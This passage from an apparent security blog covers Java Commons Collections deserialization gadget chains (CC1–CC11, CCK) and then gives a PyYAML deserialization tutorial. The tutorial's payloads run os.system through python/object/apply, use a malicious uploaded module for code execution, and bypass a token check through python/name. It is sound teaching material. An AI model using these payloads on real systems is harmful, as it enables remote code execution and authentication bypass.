title="入口"></a>入口</h3><ol><li>AnnotationInvocationHandler(CC1、CC3)</li><li>PriorityQueue(CC2、CC4)</li><li>BadAttributeValueExpException(CC5、CC11)</li><li>HashMap(CC6、CCK1&#x2F;2&#x2F;3&#x2F;4)</li><li>HashTable(CC7、CC9)</li><li>HashSet(CC6、CC10)</li><li>TreeBag(CC8)</li></ol><h3 id="出口"><a href="#出口" class="headerlink" title="出口"></a>出口</h3><ol><li>LazyMap.get() &#x3D;&gt; x.transform()<ul><li>CC1、CC3、CC5、CC6、CC7、CC9、CC10、CC11、CCK1&#x2F;2&#x2F;3&#x2F;4</li></ul></li><li>TransformingComparator.compare() &#x3D;&gt; x.transform()<ul><li>CC2、CC4、CC8</li></ul></li></ol><h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><h4 id="Transformers"><a href="#Transformers" class="headerlink" title="Transformers"></a>Transformers</h4><p>主要是触发xxxTransformer.transform()方法，不同xxxTransformer的transform()方法有不同的效果。</p><ol><li><code>ChainedTransformer.Transform()</code>：反射执行Runtime.exec()。</li><li><code>InstantiateTransformer.transform()</code>触发TrAXFilter实例化调用newTransformer() &#x3D;&gt; templates<ul><li>见CC3</li></ul></li></ol><h4 id="Templates"><a href="#Templates" class="headerlink" title="Templates"></a>Templates</h4><p>前面我们提到要利用TemplatesImpl加载字节码需要调用<code>TemplatesImpl.newTransformer()</code> ，除了借助TrAXFilter外，TemplatesImpl中还有一个getOutputProperties()方法，注意<strong>它是getattr方法</strong>，因此可以与一些利用链结合。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title function_">getOutputProperties</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.newTransformer().getOutputProperties();<br>    &#125; <span class="hljs-keyword">catch</span> (TransformerConfigurationException var2) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="一些小点"><a href="#一些小点" class="headerlink" title="一些小点"></a>一些小点</h3><ul><li><p>LazyMap.decorate()方法可以修饰任意Map的子类，比如HashMap、TiedMapEntry。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.util.Map <span class="hljs-title function_">decorate</span><span class="hljs-params">( Map map, Transformer factory)</span><br></code></pre></td></tr></table></figure><ul><li><strong>注意：返回的LazyMap被调用get()方法后会触发map.put()、factory.transform()</strong></li></ul></li><li><p>对于ChainedTransformer要先置入fake-chain，构造完成再填入，以免在序列化的过程中本地触发。</p></li></ul><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><ul><li>DEP：commons-collections:3.1</li><li>IN：AnnotationInvocationHandler.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：transformers-chain</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">AnnotationInvocationHandler.readObject()<br>Map(Proxy).entrySet()<br>   AnnotationInvocationHandler.invoke()<br>      LazyMap.get()<br>         ChainedTransformer.transform()<br>&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><ul><li>DEP：commons-collections4:4.0</li><li>IN：PriorityQueue.readObject()</li><li>OUT：TransformingComparator.compare()</li><li>SINK：InvokerTransformer.transform() || Templates</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">PriorityQueue.readObject()<br>   ...<br>      TransformingComparator.compare()<br>         InvokerTransformer.transform()<br>            Method.invoke()<br>               Runtime.<span class="hljs-built_in">exec</span>()<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><ul><li>DEP：commons-collections:3.1</li><li>IN：AnnotationInvocationHandler.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">AnnotationInvocationHandler.readObject()<br>Map(Proxy).entrySet()<br>   AnnotationInvocationHandler.invoke()<br>      LazyMap.get()<br>      InstantiateTransformer.transform() <br>        TrAXFilter.newInstance()<br>        TransformerImpl.newTransformer()<br>        &lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><ul><li>DEP：commons-collections4:4.0</li><li>IN：PriorityQueue.readObject()</li><li>OUT：TransformingComparator.compare()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">PriorityQueue.readObject()<br>  ...<br>     TransformingComparator.compare()<br>           InstantiateTransformer.transform() <br>       TrAXFilter.newInstance()<br>       TransformerImpl.newTransformer()<br>       &lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><ul><li>DEP：commons-collections:3.1</li><li>IN：BadAttributeValueExpException.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：transformers-chain</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">BadAttributeValueExpException.readObject()<br>      TiedMapEntry.toString()<br>           LazyMap.get()<br>               ChainedTransformer.transform()<br>               &lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><ul><li>DEP：commons-collections:3.1</li><li>IN：HashMap.readObject() || HashSet.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：transformers-chain</li></ul><p>1.HashMap版本(Lite)</p><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">HashMap.readObject()<br>       HashMap.<span class="hljs-built_in">hash</span>()<br>           TiedMapEntry.hashCode()<br>              TiedMapEntry.getValue()<br>                 LazyMap.get()<br>ChainedTransformer.transform()<br>&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure></blockquote><p>2.HashSet版本</p><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">HashSet.readObject()<br>    HashMap.put()<br>       HashMap.<span class="hljs-built_in">hash</span>()<br>           TiedMapEntry.hashCode()<br>              TiedMapEntry.getValue()<br>                 LazyMap.get()<br>ChainedTransformer.transform()<br>&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><ul><li>DEP：commons-collections:3.1</li><li>IN：Hashtable.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：transformers-chain</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"> Hashtable.readObject()<br>Hashtable.reconstitutionPut()<br> AbstractMapDecorator.equals()<br> AbstractMap.equals()<br> LazyMap.get()<br> ChainedTransformer.transform()<br> &lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC8"><a href="#CC8" class="headerlink" title="CC8"></a>CC8</h2><ul><li>DEP：commons-collections4:4.0</li><li>IN：TreeBag.readObject()</li><li>OUT：TransformingComparator.compare()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">org.apache.commons.collections4.bag.TreeBag.readObject<br>org.apache.commons.collections4.bag.AbstractMapBag.doReadObject<br>java.util.TreeMap.put<br>java.util.TreeMap.compare<br>org.apache.commons.collections4.comparators.TransformingComparator.compare<br>InvokerTransformer.transform -&gt; TransformerImpl.newTransformer()<br>&lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC9"><a href="#CC9" class="headerlink" title="CC9"></a>CC9</h2><ul><li>DEP：commons-collections:3.1</li><li>IN：Hashtable.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：transformers-chain</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">java.util.Hashtable.readObject<br>    java.util.Hashtable.reconstitutionPut<br>      org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>        org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>            org.apache.commons.collections.map.LazyMap.get()<br>            &lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC10"><a href="#CC10" class="headerlink" title="CC10"></a>CC10</h2><ul><li>DEP：commons-collections:3.2.1</li><li>IN：HashSet.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：Templates</li></ul><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">java.util.HashSet.readObject()<br>    java.util.HashMap.put()<br>    java.util.HashMap.<span class="hljs-built_in">hash</span>()<br>        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()<br>          org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()<br>            org.apache.commons.collections.map.LazyMap.get()<br>               InvokerTransformer.transform() -&gt; TransformerImpl.newTransformer()<br>               &lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h2><ul><li>DEP：commons-collections:3.2.1</li><li>IN：BadAttributeValueExpException.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：Templates</li></ul><blockquote><p>modify from Payload CC5.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">BadAttributeValueExpException.readObject()<br>      TiedMapEntry.toString()<br>           LazyMap.get()<br>               InvokerTransformer.transform() -&gt; TransformerImpl.newTransformer()<br>               &lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CCK1-x2F-2"><a href="#CCK1-x2F-2" class="headerlink" title="CCK1&#x2F;2"></a>CCK1&#x2F;2</h2><ul><li>DEP：commons-collections:&lt;&#x3D;3.2.1 || commons-collections4:4.0</li><li>IN：HashMap.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：Templates</li></ul><blockquote><p>For shiro-exploit. MemShell Injection.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">HashMap.readObject<br>  TiedMapEntry.hashCode<br>    TiedMapEntry.getValue<br>      LazyMap.get<br>        InvokerTransformer.transform -&gt; TransformerImpl.newTransformer()<br>          &lt;Templates&gt;<br></code></pre></td></tr></table></figure></blockquote><h2 id="CCK3-x2F-4"><a href="#CCK3-x2F-4" class="headerlink" title="CCK3&#x2F;4"></a>CCK3&#x2F;4</h2><ul><li>DEP：commons-collections:&lt;&#x3D;3.2.1 || commons-collections4:4.0</li><li>IN：HashMap.readObject()</li><li>OUT：LazyMap.get()</li><li>SINK：Templates</li></ul><blockquote><p>For shiro-exploit.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">  HashMap.readObject<br>    TiedMapEntry.hashCode<br>      TiedMapEntry.getValue<br>        LazyMap.get<br>&lt;transformers-chain&gt;<br></code></pre></td></tr></table></figure></blockquote><h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a href="https://su18.org/post/ysuserial/">Java 反序列化取经路 | 素十八 (su18.org)</a></p><p><a href="https://su18.org/post/ysoserial-su18-2">https://su18.org/post/ysoserial-su18-2</a></p><p><a href="https://forum.butian.net/share/1538">https://forum.butian.net/share/1538</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>CC chains</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PyYaml反序列化</title>
    <link href="/2023/05/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/05/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="YAML基础"><a href="#YAML基础" class="headerlink" title="YAML基础"></a>YAML基础</h1><p>基础语法见附录，借用一个简单的例子快速入门：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml<br><br>yaml.load(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">string_0:</span><br><span class="hljs-string">    - macr0phag3</span><br><span class="hljs-string">    - &quot;I&#x27;m Tr0y&quot;  # 可以使用双引号或者单引号包裹特殊字符</span><br><span class="hljs-string">    - &quot;I am fine. \u263A&quot; # 使用双引号包裹时支持 Unicode 编码</span><br><span class="hljs-string">    - &quot;\\x0d\\x0a is \\r\\n&quot; # 使用双引号包裹时还支持 Hex 编码</span><br><span class="hljs-string">    - newline</span><br><span class="hljs-string">      newline2  # 字符串可以拆成多行，每行之间用空格隔开</span><br><span class="hljs-string"></span><br><span class="hljs-string"># &gt; 可以在字符串中折叠换行</span><br><span class="hljs-string">string_1: &gt;</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string"># &#124; 保留换行符</span><br><span class="hljs-string">string_2: &#124;</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string"># &#124; 保留换行符，且去掉最后一个换行符</span><br><span class="hljs-string">string_3: &#124;-</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string">list: &amp;id_1</span><br><span class="hljs-string">- 18  # 定义锚点</span><br><span class="hljs-string">- cm</span><br><span class="hljs-string"></span><br><span class="hljs-string">two_dimensional_list:</span><br><span class="hljs-string">-</span><br><span class="hljs-string">    - Macr0phag3</span><br><span class="hljs-string">    - Tr0y</span><br><span class="hljs-string"></span><br><span class="hljs-string">boolean: </span><br><span class="hljs-string">    - TRUE  # true、True、Yes、YES、yes、ON、on、On 都可以</span><br><span class="hljs-string">    - FALSE  # false、False、NO、no、No、off、OFF、Off 都可以</span><br><span class="hljs-string"></span><br><span class="hljs-string">float:</span><br><span class="hljs-string">    - 3.14</span><br><span class="hljs-string">    - 6.8523015e+5  # 可以使用科学计数法</span><br><span class="hljs-string"></span><br><span class="hljs-string">int:</span><br><span class="hljs-string">    - 123</span><br><span class="hljs-string">    - 0b10100111010010101110  # 支持二进制表示</span><br><span class="hljs-string">    - 0x0a  # 支持十六进制表示</span><br><span class="hljs-string"></span><br><span class="hljs-string">nulls:</span><br><span class="hljs-string">  - null  # NULL 也 ok</span><br><span class="hljs-string">  - Null</span><br><span class="hljs-string">  - ~</span><br><span class="hljs-string">  -</span><br><span class="hljs-string"></span><br><span class="hljs-string">date:</span><br><span class="hljs-string">    - 2018-02-17  # 日期必须使用 ISO 8601 格式，即 yyyy-MM-dd</span><br><span class="hljs-string"></span><br><span class="hljs-string">datetime: </span><br><span class="hljs-string">    -  2018-02-17T15:02:31+08:00  # 时间使用 ISO 8601 格式，时间和日期之间使用 T 连接，最后使用 + 代表时区</span><br><span class="hljs-string"></span><br><span class="hljs-string"># &gt; 可以在字符串中折叠换行</span><br><span class="hljs-string">object: &amp;id_2</span><br><span class="hljs-string">    name: Tr0y</span><br><span class="hljs-string">    money: 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">json: [&#123;1: Macr0phag3, 2: Tr0y&#125;, &quot;???&quot;]  # 值支持 json</span><br><span class="hljs-string"></span><br><span class="hljs-string">reference: </span><br><span class="hljs-string">    size: *id_1</span><br><span class="hljs-string">    &lt;&lt;: *id_2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8d42331c-e3bd-4620-af91-f6c797f8117e.png!blog" alt="img"></p><h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>所谓类型转换，就是使用符号<code>!!</code>+<code>tag</code>实现数据类型的强制转换，比如<strong>将数字强制转换成字符串</strong>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">a:</span> <span class="hljs-type">!!str</span> <span class="hljs-number">123</span><br><span class="hljs-comment">#等价于</span><br><span class="hljs-attr">a:</span> <span class="hljs-string">&quot;123&quot;</span><br></code></pre></td></tr></table></figure><p>基于这种特性，PyYAML可以实现<strong>拓展解析</strong>的能力，选择合适的解析器对数据进行解析处理，可以是简单的数据类型，也可以是<strong>模块、实例</strong>。doc中列举除了一些基础tag和特殊tag:</p><img src="/2023/05/17/PyYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230519193611913.png" class="" title="image-20230519193611913"><ul><li><strong>基础类型转换</strong></li></ul><p><code>site-packages/yaml/constructor.py</code>中有24处调用<code>add_constructor()</code>的地方，也就是说PyYAML中支持24中基础的类型转换，也就是上图中的<code>Standard YAML tag</code>与<code>Python-specific tags</code>部分，对于基础的类型转换可以简单抽象成以下过程：</p><blockquote><p>!!module_name args   &lt;&#x3D;&gt;  find_function(“module_name”)(args)</p></blockquote><ul><li><strong>高级类型转换</strong></li></ul><p>除了<code>add_constructor()</code>之外，还有<code>add_multi_constructor()</code>的调用，也就是对应上图中的<code>Complex Python tags</code>：</p><table><thead><tr><th align="center">tag</th><th align="center">expression</th></tr></thead><tbody><tr><td align="center"><code>!!python/name:module.name</code></td><td align="center"><code>module.name</code></td></tr><tr><td align="center"><code>!!python/module:package.module</code></td><td align="center"><code>package.module</code></td></tr><tr><td align="center"><code>!!python/object:module.cls</code></td><td align="center"><code>module.cls</code> instance</td></tr><tr><td align="center"><code>!!python/object/new:module.cls</code></td><td align="center"><code>module.cls</code> instance</td></tr><tr><td align="center"><code>!!python/object/apply:module.f</code></td><td align="center">value of <code>f(...)</code></td></tr></tbody></table><p>很明显这五种tag都可以引入新的模块，导致PyYAML存在被反序列化攻击的可能。</p><p>下面逐一介绍高级类型转换中的五个标签。</p><h2 id="危险标签"><a href="#危险标签" class="headerlink" title="危险标签"></a>危险标签</h2><h3 id="python-x2F-object-x2F-apply"><a href="#python-x2F-object-x2F-apply" class="headerlink" title="python&#x2F;object&#x2F;apply"></a>python&#x2F;object&#x2F;apply</h3><p>对应<code>construct_python_object_apply</code>，它可以引入模块中的方法并执行，可以传入参数并且以列表的方式提供：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#以下几种写法等价</span><br>yaml.load(<span class="hljs-string">&#x27;exp: !!python/object/apply:os.system [&quot;whoami&quot;]&#x27;</span>)<br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [whoami]&quot;</span>) <span class="hljs-comment">#引号可省略</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  args: [&quot;whoami&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]: exp&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="python-x2F-object-x2F-new"><a href="#python-x2F-object-x2F-new" class="headerlink" title="python&#x2F;object&#x2F;new"></a>python&#x2F;object&#x2F;new</h3><p>与<code>python/object/apply</code><strong>基本等价</strong>，对应函数<code>construct_python_object_new</code>，payload也相同。</p><h3 id="python-x2F-object"><a href="#python-x2F-object" class="headerlink" title="python&#x2F;object"></a>python&#x2F;object</h3><p>对应函数<code>construct_python_object</code>，可以调用构造函数但无法传参。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;!!python/object:builtins.copyright&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="python-x2F-module"><a href="#python-x2F-module" class="headerlink" title="python&#x2F;module"></a>python&#x2F;module</h3><p>对应函数<code>construct_python_module</code>，后续调用<code>find_python_module</code>，也就是<code>import</code>，一般情况下<code>import</code>导入模块不会执行py文件里的代码，除了命名空间<code>__name__ == &quot;__main__&quot;</code>的代码部分。这时候想要利用这个标签RCE，自然会联想到结合任意文件上传，那么这就有点类似于php的文件包含了，不过后缀必须是py。举个例子存在如下flask项目：</p><blockquote><p>├── app.py<br>├── static<br>├── templates<br>│   └── index.html<br>└── uploads<br>   ├── exp.py<br>   └── info.py</p></blockquote><p>app.py中包含如下利用代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;!!python/module:uploads.exp&quot;</span>)<br></code></pre></td></tr></table></figure><p>exp.py为恶意模块</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;id&quot;</span>)<br></code></pre></td></tr></table></figure><p>然后执行app.py就可以实现rce。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 app.py<br><span class="hljs-comment">#uid=1000(spring) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure><p>或者可以上传<code>__init__.py</code>至uploads文件夹，不需要指定包名就可以直接触发：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;!!python/module:uploads&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="python-x2F-name"><a href="#python-x2F-name" class="headerlink" title="python&#x2F;name"></a>python&#x2F;name</h3><p>对应函数是<code>construct_python_name</code>，后续调用<code>find_python_name</code>，他返回模块下面的属性或方法。它可以用于以下特殊场景：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml<br><br>TOKEN = <span class="hljs-string">&quot;Y0u_Nev3r_kn0w.&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">config</span>):<br>    <span class="hljs-keyword">try</span>:<br>        token = yaml.load(config).get(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        token = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> token == TOKEN:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes, master.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fuck off!&quot;</span>)<br><br>config = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 可控输入点</span><br>check(config)<br></code></pre></td></tr></table></figure><p>这时将payload设置为<code>token=!!python/name:__main__.TOKEN</code>，就可以绕过对于token的check，前提是<strong>需要知道变量名</strong>是<code>token</code>，当然这种情况下直接RCE也是可以的。</p><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="PyYAML-lt-5-1"><a href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML &lt; 5.1"></a>PyYAML &lt; 